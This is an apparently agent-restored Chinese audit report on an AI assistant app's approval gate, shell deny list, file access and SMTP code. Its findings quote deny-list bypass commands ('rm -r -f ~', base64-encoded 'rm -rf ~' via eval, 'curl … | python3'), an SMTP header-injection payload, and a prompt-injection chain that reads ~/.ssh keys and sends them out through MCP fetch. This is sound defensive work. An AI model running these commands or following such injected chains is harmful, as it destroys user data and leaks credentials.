# Lucas 生产级全盘审计报告（2026-10-30）

> 说明：本文件曾被 Cursor 覆盖，之后由镇元重建了摘要版。现由 Devin 根据本次会话中的原文原样恢复正文（第 0–7 节和附录），并新增「附录 B：第一轮修复复核」。

- 审计对象：`/Users/w/Desktop/japlosv2/clone`（HEAD `5246a10`，最近一个已发版 tag `v0.5.4` = `d8b0007`）
- 方式：只读审计。没有改代码、没有提交、没有跑 `publish.sh`，也没有读 `Config/release.env` 和 `.secrets`。
  复现用的探针放在仓库外（`/tmp/lucas-probe`，以 path 依赖方式引用本仓库），运行时数据只读查询。
- 证据格式：`文件:行号`，或者"命令 + 输出"。无法直接证实的结论标【推测】。

---

## 0. 基线：构建与测试的真实结果

| 命令 | 结果 |
|---|---|
| `swift build` | **成功**，退出码 0，增量构建 2.44s。8 条 warning，全部是 Swift 6 Sendable 问题（`MemoryKnowledgeTools.swift:17/62/95/146` 持有非 Sendable 的 `KernelStore`）。在探针里做完整编译时，还多出一条：`WeChatChannel.swift:125: instance method 'lock' is unavailable from asynchronous contexts` |
| `swift test` | **成功**，退出码 0，2.3s。XCTest 共 **20 个用例**（Protocol 11 / Kernel 5 / Runtime 4），0 失败；Swift Testing 0 个。测试代码一共 245 行，生产代码 21,848 行 |
| `bash scripts/smoke_test.sh`（端到端，在临时目录里跑） | **失败**，退出码 1。在第 1 步 `grep -q '"tools": 15'` 就挂了，实际工具数是 41（`kernel.status` 返回 `"tools": 41`）。也就是说端到端冒烟测试已经过期，没人在跑 |

运行时佐证（只读）：
- `kernel.sqlite3`：64 张表（含 FTS5 影子表），`PRAGMA user_version = 0`，`integrity_check = ok`。逐表 `count(*)` 后，**除 sessions/turns/configurations/tool_invocations/mcp_events/self_healing_events/permission_grants/persistence_migrations/configuration_history 之外，其余全部 0 行**。
- `~/Library/Logs/Lucas/lucasd.log`：时间戳 `09:24:26 shutting down` 排在 `09:24:28 listening` **之后**，说明日志被覆盖写（见 P2-01）。

---

## 1. 总评

**总分：4 / 10**

功能面铺得很广（聊天、工具、MCP、记忆、知识库、三个通道、Sparkle 发版链路都有），代码风格统一，没有 `try!`、`fatalError` 或强制解包崩溃点，发版脚本也有基本护栏。问题在于两点：一是"统一审批闸"不是默认拒绝，而是靠工具名白名单打补丁，已经实测出两条无需审批就能产生副作用的路径；二是大量看起来已完成的能力其实只是脚手架（微信外发、微信审批回推、飞书知识导入、二十多张 ledger 表、六十多个没人调用的 RPC）。测试几乎是空的，唯一的端到端测试已经坏了。按现状不建议对外推广。

| 维度 | 分数 | 理由 |
|---|---|---|
| 架构 | 5 / 10 | Target 依赖方向正确（Protocol ← Kernel ← Runtime ← japlosd，App 只依赖 Protocol），没有循环依赖。但 `KernelCore` 是上帝聚合体（一个 `handle` 方法里 94 个 case，约 800 行），传输层 `UnixSocketServer` 直接耦合了微信审批桥，Protocol 层的 `ToolApprovalGate` 硬编码了 Kernel 的工具名（知识方向反了）。RPC 信封里的 `protocolVersion`、`deadline`、`cancellationID`、`principal` 字段内核要么不校验，要么不生效 |
| 可维护性 | 3.5 / 10 | 四个超大文件：`SettingsView.swift` 3561 行、`KernelStore.swift` 1986 行（58 个几乎同构的 CRUD）、`AppModel.swift` 1797 行（29 个 `@Published`、64 个方法）、`KernelCore.swift` 1169 行。110 个 KernelOperation 中有 64 个 App 从未调用，其中大量是别名。真实测试覆盖率接近 0 |
| 可靠性 | 4 / 10 | 没有 schema 迁移机制，也没有事务；"停止"并不能可靠地停住后端任务；Shell 输出超过管道缓冲（约 64KB）必然超时被杀；更新后 App 会继续连旧版 daemon；daemon 崩溃后 App 不会重启它；已发布用户永远拿不到提示词修复 |
| 安全 | 3 / 10 | 实测确认：PDF 工具可以无审批覆盖家目录下任意文件；MCP 工具全部无审批；文件读取可以无审批读 `~/.ssh/id_rsa` 和 `secrets.json`；Shell 的"硬拒绝"能被轻易绕过；policy 层的 principal 由客户端自报；微信审批回推（目前休眠）没有发件人校验，"ok"/"y" 这样的词就能批准 |

---

## 2. 问题清单

> 严重度定义：**P0** = 会崩溃、丢数据、安全闸被绕过或无法发版；**P1** = 必须在对外发版前修；**P2** = 应当修。
> 工作量按一名熟悉代码的工程师估算：S ≤ 0.5 天，M ≈ 1–2 天，L ≥ 3 天。

### P0

| 编号 | 严重度 | 类别 | 位置 | 问题 | 证据 | 建议修法 | 工作量 |
|---|---|---|---|---|---|---|---|
| P0-01 | P0 | 安全 / 丢数据 | `Sources/JaplosKernel/DocumentTools.swift:26-27, 40-50, 59-66`；`Sources/JaplosProtocol/Tools.swift:183-205` | `system.document.pdf.create` 的风险等级是 `.low`，也不在审批白名单里，所以**无需审批**就能把家目录、`/tmp`、`/Users/Shared` 下任意已有文件覆盖成 PDF（`CGDataConsumer(url:)` 直接截断目标文件）。路径只做了信任根校验，没有"禁止覆盖已有文件"的检查。配合 `mail.read`（低风险、无审批）这类可读入外部不可信内容的入口，提示注入可以直接毁掉 `~/.zshrc`、`~/Documents/*.docx` 等文件 | **实测**：启动临时 daemon 后执行 `tool.invoke {"name":"system.document.pdf.create","arguments":{"text":"pwned","path":"/tmp/lucas-audit-victim.txt"}}`，返回 `"ok": true`，文件头变成 `%PDF-1.3`；同一 RPC 下 `system.filesystem write` 则返回 `approval_required`。探针：`pdf.create requiresApproval(path=~/.zshrc): false`。冒烟脚本 `scripts/smoke_test.sh:115-117` 本身就在走这条无审批路径 | 把审批闸改成**默认需要审批**（见 P0-02）；PDF 工具改为 `.high`，或者"只允许写新文件、默认写到 `~/Downloads`、目标已存在就报错"；再加一个表驱动测试，遍历 `ToolRegistry` 里所有真实工具，断言它们的审批分类 | S |
| P0-02 | P0 | 安全 / 审批绕过 | `Sources/JaplosKernel/MCPClient.swift:515-523`；`Sources/JaplosProtocol/Tools.swift:183-205`；`Sources/JaplosKernel/KernelCore.swift:1026-1049` | 所有 MCP 工具都被硬编码为 `risk: .medium`，而审批闸只拦 `.high` 和固定名单，所以**任何 MCP 工具都不需要审批**，包括 MCP 服务器提供的写文件、执行命令、发 HTTP 请求。这样就能拼出一条全程零审批的外泄链：`mail.read`（注入）→ `system.filesystem read ~/.ssh/id_rsa`（无审批，见 P1-02）→ MCP 的 http/fetch 工具（无审批）把内容发出去 | 探针：`mcp.* requiresApproval: false`；`smoke_test.sh:124` 用 `tool.invoke` 直接调 `mcp.echo.echo` 并期望成功，说明 RPC 层也放行 | MCP 工具默认需要审批。读取 `tools/list` 返回的 `annotations.readOnlyHint` 和 `destructiveHint`，只有当服务器声明只读、且用户在设置里明确信任该工具时，才免审批 | M |

### P1

| 编号 | 严重度 | 类别 | 位置 | 问题 | 证据 | 建议修法 | 工作量 |
|---|---|---|---|---|---|---|---|
| P1-01 | P1 | 安全 | `Sources/JaplosKernel/BuiltinTools.swift:493-509`（TrustRoots）、`514-544`（DangerousCommand） | Shell 的"硬拒绝、审批也不能放行"承诺可以被轻易绕过。危险命令规则只匹配 `-rf` 这种合并写法；信任根正则只检查 `/Users`、`/etc` 等少数几个前缀，而且把裸 `~` 当成安全。Shell 本身仍需审批，所以不是 P0，但注释和设置页都在给用户错误的安全预期 | 探针输出（`danger` 和 `trustroot` 都为 PASS 表示完全放行）：`rm -r -f ~`、`rm -r -f ~/Documents`、`rm --recursive --force ~`、`find ~ -delete`、`cd / && cat etc/passwd`、`eval "$(echo cm0gLXJmIH4= \| base64 -d)"`、`curl -s http://x \| python3`、`s\udo id`、`ls /Network`、`cat /dev/zero` | 不要再宣称是"硬拒绝"。黑名单只作为提示，安全边界交给审批。审批卡片要原样展示完整命令和工作目录。如果真的需要硬边界，就用 `sandbox-exec` 配一个只允许写信任根的 profile 来跑 zsh | M |
| P1-02 | P1 | 安全 | `Sources/JaplosProtocol/Tools.swift:187-188`；`Sources/JaplosKernel/BuiltinTools.swift:457-484` | `system.filesystem read/list` 不需要审批，信任根又是整个家目录。这意味着可以静默读取 `~/.ssh/*`、`~/Library/Application Support/Lucas/secrets.json`（未签名构建下这里存着全部密钥，见 `SecretStore.swift:7-9, 31`）、浏览器 Profile、`~/.aws` 等，读到的内容会作为工具结果发给远端模型，并且全文落库到 `tool_invocations` | 探针：`filesystem read secrets.json requiresApproval: false`；`TrustRoots.allowedURL("~/.ssh/id_rsa")` 返回 `/Users/w/.ssh/id_rsa`。库里已有 15KB 级别的读取输出：`select length(output_json) from tool_invocations` → `13835`、`15404` | 加一份敏感路径拒绝表：`~/.ssh`、`~/.gnupg`、`~/.aws`、`~/Library/Keychains`、`~/Library/Application Support/Lucas`、各浏览器 Profile、`~/Library/Cookies`、`~/Library/Messages`。读取工作区以外的路径改为需要审批 | S |
| P1-03 | P1 | Bug / 可靠性 | `Sources/JaplosKernel/BuiltinTools.swift:91-109` | ShellTool 是先等进程退出、再读 stdout/stderr。一旦输出超过管道缓冲区（约 64KB），子进程会阻塞在 write 上，**必然被判超时并 SIGTERM**，用户看到的是"超时"，而不是结果。另外它在 `async` 函数里用 `usleep` 忙等最长 120s，会占住 Swift 并发协作线程池里的线程 | 探针：`yes \| head -c 200000`、超时 3s → `timedOut=true exit=15 elapsed=3.3s`；同样命令输出 1KB → `timedOut=false exit=0` | 用 `readabilityHandler` 或独立线程边跑边读管道并截断；用 `terminationHandler` 加 continuation 替代忙等；`ScreenshotTool`、osascript 系列（`ExtendedTools.swift:75-96`、`DocumentTools.swift:206-212`）也一并改掉 `waitUntilExit` 阻塞 | S |
| P1-04 | P1 | Bug / 竞态 | `Sources/JaplosKernel/UnixSocketServer.swift:165-166, 229-256, 425-437` | 用户点"停止"后，App 关闭 socket，服务端 `readFrame` 抛错后直接 `break`，**但没有取消 handler 的 Task**（只有 `writer.onFailure` 才会 cancel）。`serve` 随即 `close(client)`，而后台 Task 继续跑模型和工具循环，并继续往这个**已经关闭的 fd 编号**写帧。如果这个 fd 号已经被新 accept 的连接复用，就会**把 A 会话的帧写进 B 连接**；即使没被复用，停止后的工具调用也会继续执行，直到下一次写失败 | 代码路径：`awaitStream` 中 `catch { break }` → `broker.cancelAll()` → 返回 `serve` → `defer { close(client) }`。全程没有调用 `cancellation.cancel()`；`FrameWriter` 持有的是裸 `Int32 client`（L415） | 在退出循环后先 `cancellation.cancel()`，并等待 `done` 信号；`FrameWriter` 加一个 `closed` 标志，在 close 前置位，之后的 write 一律丢弃；或者用 `dup` 后的 fd 加上 `DispatchIO` 管理所有权 | S |
| P1-05 | P1 | 安全（潜伏） | `Sources/JaplosKernel/WeChatChannel.swift:400-451`；`Sources/JaplosKernel/WeChatApprovalBridge.swift:323-349, 385-441` | 微信审批回推：`extractInboundTexts` 会递归抓取 `getupdates` 响应里**所有** `text/content/msg/message/body` 字段，**不校验发件人**，也**没有 offset/cursor**，同一批旧消息每 0.6s 会被反复拉取。审批词表里有 `ok`、`y`、`yes`，只要当前只有一笔待批，裸回复就会被采纳。结果是：任何人（或者用户自己随口一句"ok 收到"、或者历史消息里的旧"同意"）都能批准高危工具。目前之所以没出事，是因为 iLink 令牌从来没被写入（`sendText` 永远 `delivered:false`，见 `WeChatChannel.swift:237-267`）。一旦接通，就是 P0 | 探针：`parseDecision("ok 收到") → approved`，`"y" → approved`，`"yes please" → approved`，`"no problem" → denied` | 接通之前：只接受来自绑定 owner openid、晚于推送时间、且带 shortId 的消息；维护 `get_updates_buf` 游标；词表去掉 `ok/y/n/yes/no`；shortId 从 4 位 hex 加长到 6 位以上 | M |
| P1-06 | P1 | 并发 | `Sources/JaplosKernel/WeChatChannel.swift:124-181, 71-88`；`WeChatApprovalBridge.swift:41, 252, 288, 480` | `connect()` 在 `lock.lock()` 之后 `await fetchBotQRCode`，**持有 NSLock 跨挂起点**，恢复后可能在别的线程 unlock，这是未定义行为，编译器已经给出警告。`status()`、`verify()` 无锁读写 `loginSessionID`、`pendingVerification`、`lastError`；`lastPushNote` 被多线程写，没有同步 | 编译输出：`WeChatChannel.swift:125:14: warning: instance method 'lock' is unavailable from asynchronous contexts` | 把这个类改成 `actor`，或者只在同步小段内持锁、`await` 前释放；所有状态读写都走同一把锁 | S |
| P1-07 | P1 | 生产就绪 / 数据迁移 | `Sources/JaplosKernel/KernelStore.swift:33-357`；`SQLiteDatabase.swift` 全文 | **没有 schema 迁移机制**：只有 `CREATE TABLE IF NOT EXISTS`，没有 `ALTER TABLE`，没有 `user_version`，代码里也一处事务都没有（grep `BEGIN\|COMMIT\|transaction` 为 0）。`recordPersistenceMigration(v2…v7)` 是无条件写入的"迁移台账"，并不代表真的做了迁移。以后任何一次加列或改列，老用户的库都会在运行时 `no such column` 出错。迁移前也不备份，不支持回滚 | `sqlite3 kernel.sqlite3 "pragma user_version"` → `0`；`KernelStore.swift:341-356` 无条件 record | 引入有序迁移列表，以 `PRAGMA user_version` 为准；每一步迁移包在 `BEGIN IMMEDIATE…COMMIT` 里；迁移前用 `VACUUM INTO` 做备份；多语句写操作（`setConfiguration` 读 revision、`upsertSpeechProfile` 重置 default、`appendTurn`+`touchSession`）统一走事务 | M |
| P1-08 | P1 | 丢数据 | `Sources/JaplosKernel/KernelStore.swift:663-675` | `migratePlaintextModelSecret`：`try? secrets.setSecret(key…)` 吞掉了错误，然后**无论成功与否**都把 SQLite 里的 `apiKey` 置空。只要钥匙串和文件写入都失败（磁盘满、权限问题、沙盒），用户的模型 Key 就会永久丢失 | 代码第 671 行 `try?`，第 672-673 行无条件覆盖 | 改成 `do { try setSecret } catch { log; return }`；写入后再 `secret(for:)` 读回校验，校验通过才清空明文 | S |
| P1-09 | P1 | Bug / 发版 | `Sources/JaplosRuntime/PromptLibrary.swift:89-94, 177-203`；`SceneRouter.swift:75-87, 91-111` | 提示词和场景是"覆盖目录优先"，而 `seedOverridesIfNeeded` 会把**所有**内置 `.md` 复制进覆盖目录（`scenes.json` 也是缺失时复制）。结果是首次安装后，覆盖目录永远会遮住 App Bundle 里的版本。**之后所有版本里的提示词和场景修复（例如最近那次 "fix desktop-file scenes"）都到不了已安装用户** | 代码逻辑：`load()` 先读 override（L91-94）；seed 逐文件复制、已存在就跳过（L194），不比较版本 | 只把用户真正编辑过的文件当作 override（例如记录 seed 时的哈希，内容不同才算覆盖）；或者在 override 目录写版本戳，升级时对未修改的文件做替换 | S |
| P1-10 | P1 | 生产就绪 / 更新 | `Sources/JaplosApp/KernelClient.swift:267-307`；`Sources/JaplosApp/AppModel.swift:192`；`Sources/JaplosKernel/KernelCore.swift:17` | Sparkle 替换 App 后，旧的 `lucasd` 进程仍在运行，新 App 一 `ping` 通就直接复用，**新 App 会一直连旧 daemon**，直到注销或重启电脑。内核不校验 `protocolVersion`（grep 显示只有 `KernelCore.swift:186` 回显这个字段），daemon 版本又硬编码为 `"1.0.0"`。另外 `ensureRunning` 只在启动时调用一次，**daemon 运行中崩溃后，App 不会重新拉起它** | grep：App 中没有任何 `kernelShutdown` 调用；`ensureRunning` 只有 `AppModel.swift:192` 一处 | 启动握手时比较 `CFBundleVersion` 和 daemon 版本，不一致就发 `kernel.shutdown` 再重启 daemon；`callAsync` 遇到 `cannotConnect` 时自动执行一次 `ensureRunning` 并重试；更好的做法是改用 `SMAppService` 或 launchd 托管 daemon | M |
| P1-11 | P1 | Bug / 性能 | `Sources/JaplosKernel/KernelStore.swift:1216-1277`；`Sources/JaplosRuntime/ContextInjector.swift:55` | 所谓"混合检索"实际上只扫最近 300 篇文档（L1222）。FTS 命中的 ID 只是给这 300 篇加分，**第 301 篇之后的文档永远检索不到**。每次查询都对每篇文档现场算 `NLEmbedding`（L1258），而且**每条聊天消息**都会通过 `ContextInjector` 触发一次。`knowledge_vectors`、`knowledge_chunks` 这两张表根本没用上 | 运行库：`knowledge_vectors=0`、`knowledge_chunks=0`；代码只在 `KernelStore.swift:1844, 1852` 把它们列入 ledger 名单 | 以 FTS5 召回 top-K 作为候选集，再做向量重排；向量在入库时计算、写入 `knowledge_vectors`；长文档切块写入 `knowledge_chunks` | M |
| P1-12 | P1 | 安全 / 外发 | `Sources/JaplosKernel/MailIMAPSMTP.swift:184-191, 249-265`；`MailChannel.swift:449-452` | SMTP 的 `RCPT TO`、`From`、`To`、`Cc`、`Subject` 直接拼接，**不过滤 CR/LF**。`to` 或 `subject` 里塞一个 `\r\nBcc: x@evil` 就能注入隐藏收件人或额外 SMTP 命令，而审批卡片里展示的是 JSON 转义后的字符串，用户很难察觉 | 代码直接插值：`"RCPT TO:<\(r)>"`、`"Subject: \(subject)"` | 所有头字段拒绝 `\r`、`\n`；收件人做 RFC 5322 地址校验；Subject 用 RFC 2047 编码；审批卡片把收件人逐个列出 | S |
| P1-13 | P1 | 安全 / 架构 | `Sources/JaplosProtocol/KernelProtocol.swift:183`；`Sources/JaplosKernel/PolicyEngine.swift:13-21`；`KernelStore.swift:836-843`；`UnixSocketServer.swift:459-465` | Policy 层基本是装饰：`principal` 由客户端自报，库里只有一条 root 授权，所以 `CapabilityRouting` 映射什么都无所谓。实际的唯一边界是"socket 对端 UID 相同"，而 Team ID 校验**默认关闭**。结果是同一用户下的任何进程（比如一个恶意 npm postinstall 脚本）都拥有完整 RPC 权限：`runtime.feishu.send_text` 直接外发、`configuration.set mcp.servers` 写入任意命令（下次 `mcp.refresh` 时被 spawn）、用 `model.test` 把已存的 API Key 发到任意 `baseURL`（`ChatService.swift:352-360`） | `smoke_test.sh:50-57` 只验证了"自报 intruder 会被拒绝"，反过来说明自报 `local-user` 就会被放行；`permission_grants` 表只有 1 行 | 签名构建默认开启 Team ID 校验（Info.plist 写入 Team ID，env 只用于放宽）；`principal` 由服务端根据对端身份确定，不再信任客户端；`model.test` 在 `baseURL` 改变时不得回落到已存的 Key | M |
| P1-14 | P1 | 测试 | `Tests/` 全部；`scripts/smoke_test.sh:45` | 20 个单测，覆盖的只是编解码、glob、几条正则。**`KernelStore` 和迁移、`ChatService` 工具循环、`ApprovalBroker`、`UnixSocketServer`、MCP、邮件、`SecretStore`、App 层全部零测试**。端到端冒烟测试已经过期，第 1 步就失败（见第 0 节）。还有假测试，详见第 4 节 | `find Tests -name '*.swift' \| xargs wc -l` → 245 行；冒烟测试退出码 1 | 修好冒烟测试并接入 CI；补齐第 4 节列出的必测项；审批闸改为基于真实工具注册表的表驱动测试 | L |

### P2

| 编号 | 严重度 | 类别 | 位置 | 问题 | 证据 | 建议修法 | 工作量 |
|---|---|---|---|---|---|---|---|
| P2-01 | P2 | Bug / 日志 | `Sources/JaplosApp/KernelClient.swift:285-293` | `FileHandle(forWritingTo:)` 打开后没有 `seekToEnd`，每次拉起 daemon 都从偏移 0 覆盖写 `lucasd.log`，新旧日志混在一起 | `lucasd.log` 里 `09:24:26 shutting down` 出现在 `09:24:28 listening` 之后 | 先 `seekToEndOfFile()`，或者用 `O_APPEND` 打开；加上按大小轮转 | S |
| P2-02 | P2 | 崩溃恢复 | `Sources/JaplosApp/JaplosApp.swift:280-299` | 信号处理函数里用了 Swift 字符串插值和堆分配，不是异步信号安全的，崩溃时可能死锁；崩溃日志写在 `/tmp`、权限 0644 | 代码 L287 字符串插值 | 预先分配好 C 缓冲区，只调用 `write`；日志写到 `~/Library/Logs/Lucas`；或者直接依赖系统 `.ips` 崩溃报告 | S |
| P2-03 | P2 | 安全（潜伏） | `Sources/JaplosKernel/KernelCore.swift:121`；`Sources/JaplosProtocol/Tools.swift:175-178` | `handleStreaming` 的 `approval` 参数默认值是 `{ _, _ in true }`（全部自动批准），注释里也写着 "other transports may auto-approve"。将来任何新调用方只要漏传这个参数，就会静默放行所有高危工具 | 代码 | 去掉默认值，或者默认改成 `false` | S |
| P2-04 | P2 | 数据一致性 | `KernelStore.swift:424-451, 585-597`；`ChatService.swift:108-110` | 多语句写操作没有事务：并发 `setConfiguration` 时，revision 读取和历史写入会错位，而且 `INSERT OR REPLACE` 会覆盖历史；speech default 的"先清零再插入"中途失败会导致没有默认项 | 代码 | 并入 P1-07 的事务改造 | S |
| P2-05 | P2 | 通道 | `Sources/JaplosKernel/FeishuChannel.swift:170-173, 276-297` | `tenant_access_token` 有效期约 2 小时，代码里没有刷新逻辑（grep `expire\|refresh` 为 0）；`sessionActive` 只存在内存里，daemon 重启后就丢；`receive_id_type` 没有转义就拼进 URL | grep 结果 | 记录过期时间并提前刷新；会话状态持久化；用 `URLComponents` 构造 URL | S |
| P2-06 | P2 | 设计 | `Sources/JaplosKernel/MailTools.swift:132-164`；`MailChannel.swift:413-444` | `mail.send` 的 `confirm`、`draft_only` 由模型自己填写，是伪闸门，真正起作用的是审批。一封邮件要经过两次审批（先写草稿、再实发），草稿含全文，会以 0600 权限永久留在 `mail/drafts/` | 代码 | 去掉模型侧的 `confirm`，审批就是唯一确认；草稿设置 TTL 或提供清理入口 | S |
| P2-07 | P2 | 版本管理 | `scripts/build-app.sh:16`；`MCPClient.swift:140`；`KernelCore.swift:17`；`updates/appcast.xml` | 版本号有四个来源：0.4.0（构建默认值）、0.4.0（MCP clientInfo）、1.0.0（daemon），而线上已发 0.5.4。`CFBundleVersion` 用日期戳，本地随手构建出来的包会比线上版本号更"新"，于是收不到更新 | `grep sparkle:version updates/appcast.xml` → `202610301026` | 版本只保留一个来源（比如 `VERSION` 文件或 git tag），在构建时注入 Info.plist、daemon 和 MCP clientInfo | S |
| P2-08 | P2 | 签名 | `scripts/build-app.sh:171-176` | 用 `codesign --deep` 加 App 的 entitlements，会把麦克风和 Apple Events 权限一并签进 Sparkle 内嵌的 helper/XPC 和 `lucasd`。Sparkle 官方文档建议不要用 `--deep`，而是逐个签名【推测：当前 0.5.4 的更新校验能通过，但之后 Sparkle 升级后有安装失败风险】 | `check-updates.sh` 日志 `result: OK` | 由内向外逐个签名（Sparkle 的 XPC/Autoupdate → `lucasd`（不带 entitlements 或单独一份）→ App） | S |
| P2-09 | P2 | 发版流程 | `scripts/release.sh:68, 117-121`；`.gitignore`（`updates/`、`/tools/`） | `rsync --delete` 以本地被 gitignore 的 `updates/` 作为唯一真相，换一台机器或清空目录就会删掉服务器上的历史版本。`generate_appcast` 二进制没有纳入版本管理。`security unlock-keychain -p` 会把密码暴露在进程列表里 | 代码 | 去掉 `--delete`，或者先从服务器拉回再生成；工具链版本固定下来；通过 stdin 或 `-p` 以外的方式解锁钥匙串 | S |
| P2-10 | P2 | 公证 | `scripts/package-dmg.sh:34-36`；`release.sh:110-113` | DMG 是在公证之后才生成的，只做了 codesign，没有公证也没有 staple，用户首次打开 DMG 时 Gatekeeper 体验不佳 | 代码顺序 | 对 DMG 也执行 `notarytool submit` 和 `stapler staple` | S |
| P2-11 | P2 | 配置 | `Config/com.lucas.updates-check.plist` | 路径硬编码 `/Users/w`，还硬编码了服务器 IP；监控日志显示首次运行因 TCC 和路径问题失败过 | `updates-monitor.log`：`Operation not permitted`、`No such file or directory` | 安装时根据模板生成 plist；去掉 IP 硬编码 | S |
| P2-12 | P2 | 密钥卫生 | `Config/release.env.example:7, 14` | 公证钥匙串和部署私钥放在 `~/Desktop/…/clone/.secrets`，也就是工作树里（虽然已经 gitignore），桌面同步、备份或打包仓库时容易被带走 | 示例文件内容 | 移到 `~/.config/lucas-release/` 或者系统钥匙串 | S |
| P2-13 | P2 | 并发 | 全局 17 个 `@unchecked Sendable` 类型；`MemoryKnowledgeTools.swift`；`UnixSocketServer.swift:265-274` | Swift 6 模式下会变成编译错误（构建已有 8 条 warning）；每个连接用 `DispatchSemaphore` 阻塞一个 GCD 线程等待 async 结果，长时间的 `chat.send` 和 Shell 调用叠加时会导致线程爆炸或饥饿 | 构建日志 | `KernelStore` 显式声明 `@unchecked Sendable`，并写清内部有锁的理由；服务端改为 async 的 accept 循环 | M |
| P2-14 | P2 | 隐私 | `KernelStore.swift:846-870` | `tool_invocations` 永久保存完整的参数和输出，包括文件内容、邮件正文、剪贴板内容，没有保留期限，也没有脱敏 | `length(output_json)` 达到 15404 | 只保存摘要，或者设置 N 天 TTL；对 `content`、`text`、`body` 字段截断 | S |
| P2-15 | P2 | Bug | `Sources/JaplosKernel/MCPClient.swift:574-579` | MCP 工具名用 `.` 切分；`config.id` 里只要含有 `.`，就路由不到；stdio 子进程退出没有被观察到，状态会一直显示 ready | 代码 | 校验 id 只能是 `[A-Za-z0-9_-]`；监听 `terminationHandler` 并更新状态 | S |
| P2-16 | P2 | Bug | `Sources/JaplosKernel/DocumentTools.swift:138-163` | 下载完整个文件之后才检查 200MB 上限；目标文件已存在时直接删除覆盖（虽然经过审批，但卡片上看不出会覆盖） | 代码 | 先检查 `expectedContentLength`，用流式下载并设置上限；已存在时自动重命名 | S |
| P2-17 | P2 | 安全 | `Sources/JaplosKernel/BuiltinTools.swift:476-484` | 信任根先解析符号链接、再写入，存在 TOCTOU 窗口，可以通过替换符号链接越界【推测：需要本地攻击者配合】 | 代码 | 用 `open(O_NOFOLLOW)` 加 `fstat` 校验 | S |
| P2-18 | P2 | 性能 | `Sources/JaplosRuntime/SceneRouter.swift:49-67` | 每条消息都重新读盘、解析 `scenes.json`，并重新编译所有正则 | 代码 | 缓存解析结果，按 mtime 失效 | S |
| P2-19 | P2 | 死代码 | `BuiltinTools.swift:210-212`（`_ = url`）、`333-339`（纯转发包装）；`MailIMAPSMTP.swift:107, 130`（`sawLiteral`） | 无意义代码 | 代码 | 删除 | S |
| P2-20 | P2 | 开发残留 | `Sources/JaplosApp/KernelClient.swift:311-321` | 发布版本也会按 `LUCASD_PATH` 环境变量和当前目录下的 `.build/debug/lucasd` 去找 daemon 并执行 | 代码 | 用 `#if DEBUG` 包起来 | S |

---

## 3. 架构与模块化分析

### 3.1 依赖方向（合理）
`JaplosProtocol`（纯模型和编解码）← `JaplosKernel`（存储、策略、工具、通道、传输）← `JaplosRuntime`（聊天编排、提示词）← `japlosd`；`JaplosApp` 只依赖 Protocol 和 Sparkle。SwiftPM 层面没有循环依赖（见 `Package.swift`）。

### 3.2 职责混杂和上帝类
- **`KernelCore`**（`KernelCore.swift:156-947`）：一个方法里 94 个 case，把 RPC 路由、参数解析、业务逻辑和别名映射全混在一起。它还持有 wechat、feishu、mail、mcp 和 approvalBridge，是一个上帝聚合体。建议改成"操作 → handler"注册表，每个领域各自注册（Chat、Memory、Channel、Admin），参数用 Codable 结构体解码。
- **`KernelStore`**（1986 行）：58 个几乎同构的 `list/upsert/delete` 方法，每个都手写 SQL 和 JSON 映射。适合抽成泛型的 `LedgerRepository<Record>`（`id, updated_at, record_json` 三列）。
- **`UnixSocketServer`** 内嵌 `ApprovalBroker`，并直接依赖 `WeChatApprovalBridge`（L37, L198, L242），传输层和业务通道耦合。审批应该在 Runtime 层抽象成 `ApprovalService`，传输层只负责收发帧。
- **`ToolApprovalGate`** 放在 Protocol 层，却硬编码了 Kernel 的工具名（`Tools.swift:186-203`），知识方向反了。风险分类应该由每个 `KernelTool` 自己声明（例如 `func requiresApproval(arguments:) -> Bool`），默认返回 `true`。
- **App 端**：`AppModel`（1797 行）同时承担会话、流式聊天、审批、语音、记忆、任务、闹钟、知识库、MCP 事件、上下文快照；`SettingsView`（3561 行）在单个文件里装了 15 个 View。建议按功能拆成多个 Store 或 ViewModel。

### 3.3 RPC 协议稳健性
- 优点：4 字节长度前缀，帧上限 16MB（`Framing.swift:8, 46`），有读写超时，`SO_NOSIGPIPE`，socket 权限 0600，校验对端 UID。
- 缺点：
  - 内核**不校验** `protocolVersion`，`deadline`、`cancellationID`、`reason` 这几个信封字段完全不生效（grep 只看到回显或存储）。
  - 流式取消依赖"下一次写失败"（P1-04）。
  - 客户端 `ChatStream.approve` 用的是 `try?`（`KernelClient.swift:73`），审批发送失败时没有任何提示，结果是 120 或 300 秒后超时拒绝。
  - 每个请求都新建一个连接，在高频轮询的设置页里开销不小【推测】。

### 3.4 浅模块与删除测试

| 模块 | 判断 | 删掉之后 |
|---|---|---|
| `PolicyEngine` + `CapabilityRouting` + `permission_grants` | 接口复杂（capability、resource、principal、grant），实际只有一条 root 授权 | **复杂度直接消失**，真实的安全边界（UID 校验）不受影响。二选一：要么删掉，要么做成真正的边界（见 P1-13） |
| 25 张 runtime ledger 表 + `runtime.ledger.*` 四个 RPC | 纯脚手架，0 行数据，0 个调用方 | 复杂度消失 |
| information plane（types/heads/processors/revisions/deliveries/situations/subscriptions/delegations/snapshots/artifacts/modules）的 RPC 和表 | App 没有调用，全部 0 行 | 复杂度消失 |
| `WeChatApprovalBridge`（505 行） | 状态机复杂（settle/resolve/ack/prune），但底层发送永远是 `delivered:false` | 现阶段删掉后复杂度消失；等 iLink 真正接通再加回来（届时先修 P1-05） |
| `WeChatChannel` 的 send_text、send_file 工具 | 注册给模型，标为高危，**永远发送失败** | 模型不会再白白请求审批，复杂度消失 |
| 别名 RPC（`wechat.login.*`、`wechat.connection(s).*`、`feishu.connection.*`、`mail.connection.*`） | 和 `runtime.*` 完全重复，只是兼容 Japlos 的命名 | 复杂度消失（App 没有调用） |
| `FilesystemTool.allowedRoots`/`allowedURL` | 只是转发给 TrustRoots 的包装 | 复杂度转移为直接调用 `TrustRoots`，属于净减少 |
| `KernelStore` 的 58 个 CRUD | 浅而重复 | 应该**合并**为泛型仓储，复杂度不会消失，但会大幅压缩 |

---

## 4. 测试评估

**已覆盖**：帧编码（只测 encode）、JSONValue 往返、请求和响应编码、glob、授权过期判断、3 个操作的 capability 映射、审批闸（用合成定义测试）、DangerousCommand 的正向用例、TrustRoots 基本判断、SceneRouter 的部分逻辑。

**假测试 / 永不变红**：
1. `JaplosProtocolTests.testFrameTooLargeIsRejected`（L13-19）：名字说的是"拒绝超大帧"，实际断言的却是 `decodeFrameCount` **返回了**超限值，根本没有调用 `readFrame`。
2. `SceneRouterRegressionTests` 前三个用例（L26-51）：用的正则是**写死在测试文件里**的字符串，和生产配置 `scenes.json` 毫无关系，生产配置怎么改它们都不会失败。
